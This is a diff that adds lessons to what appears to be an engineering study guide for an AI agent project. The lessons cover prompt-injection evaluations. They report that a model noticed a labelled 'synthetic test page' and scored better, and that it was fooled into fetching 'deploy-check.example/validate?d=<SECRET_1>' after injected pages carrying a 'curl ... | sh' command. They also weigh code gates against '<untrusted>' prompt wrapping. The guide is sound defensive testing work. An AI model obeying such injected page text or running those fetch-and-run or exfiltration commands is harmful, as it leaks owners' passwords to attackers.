@@ -400,6 +400,77 @@ over-fitted the tests to the client that recorded them. We moved to a
 frozen corpus with a small search over it: deterministic content,
 non-deterministic queries, and only recorded pages can ever be returned."
 
+## 23. A test the subject can recognise measures less
+
+**Lesson.** If the thing under test can tell it is being tested, it may
+behave differently - people do, and so do models. Keep the label where the
+experimenter reads it, not where the subject does.
+
+**In this repo.** The first injection pages said "SYNTHETIC TEST PAGE" and
+the injected command touched a path named `jarvis-injection-canary`.
+nemotron said so in its answers ("the search results only returned a
+synthetic test page") and was fooled 0 times in 15. With the label moved to
+the tape file's metadata and a plausible `curl ... | sh`, it was fooled 3
+times in 14 - every time by the page asking it to send the password out.
+
+**Say it in an interview.** "Our first adversarial eval told the model it
+was a test, and it scored perfectly. We moved the label out of what the
+model sees and the attack success rate went from 0% to 20%: the honest
+number."
+
+## 24. Check that a test reaches the code before trusting its pass
+
+**Lesson.** A security test that passes may never have exercised the
+defence. Check that the input reaches the code under test - and, for a
+defence that only acts when attacked, that the attack actually landed.
+
+**In this repo.** Of eight first-draft injection inputs, four never reached
+a model: a path in the request made the router run a tool directly. llama
+then passed every attack because it never calls a tool after reading a
+page - unfoolable, and useless as evidence. And attacks nemotron ignored
+pass with the gate switched off. The cases that fail without the gate are
+the ones where an action happens every time: the owner's own write after a
+page (`inj.later_turn`), and the bait nemotron always takes (`inj.exfil`).
+
+**Say it in an interview.** "Every security case gets a route check before
+we trust it, and the suite gets a mutation run with the defence disabled.
+That run is the only evidence the suite tests the defence and not the
+model's good manners."
+
+## 25. "Ran" means it left, not that it succeeded
+
+**Lesson.** For a side effect, the question is whether the request went
+out, not whether the reply came back. A failed request can have done all
+the harm.
+
+**In this repo.** With the gate disabled, nemotron fetched
+`deploy-check.example/validate?d=<SECRET_1>`, and the eval still passed:
+the replay had no page for that address, so the call's status was
+`failed`, and the check only counted `executed`. A real fetch that failed
+would still have sent the address. `check.rs` now counts `failed` as ran;
+only a call stopped before it left - declined, denied, withheld - did not.
+
+**Say it in an interview.** "Our exfiltration check passed with the defence
+off, because the request errored. We fixed the predicate: for anything that
+can leak, an attempted request is the event, not a successful one."
+
+## 26. The layer you can verify is the one you rely on
+
+**Lesson.** Defences that work by persuading a model ("this text is data")
+and defences enforced by code are not equals. Measure the first; depend on
+the second.
+
+**In this repo.** Wrapping untrusted text in `<untrusted>` did not change
+how often nemotron tried the exfiltration (3 of 3, either way); it made
+nemotron warn the owner more often (4 times against 1). What stopped every
+attempt was code: the redactor, which meant the model never had the
+password, and the exfiltration rule, which withheld the fetch.
+
+**Say it in an interview.** "Prompt-level defences are a usability layer:
+they make the model more likely to flag an attack. The guarantee is the
+gate in code, which holds when the model is fooled - and we measured it
+being fooled."
+
 ---
 
 ## Self-test
@@ -449,6 +520,12 @@ Answer out loud, without opening the code:
 21. Why does the tape recorder refuse to keep a tool error, even a 404?
 22. Why could recording nemotron's searches never make its web cases
     replayable, and what does a frozen corpus give up in exchange?
+23. The first injection run scored 0 fooled in 15. Why did that overstate
+    the model, and what changed the number?
+24. llama passed every attack case. Why is that not evidence the gate
+    works, and which cases are?
+25. With the gate off, the exfiltration case still passed. Why?
+26. Marking untrusted text did not reduce attempts. Why keep it?
 
 ## Skills map: SDE2 -> senior
 
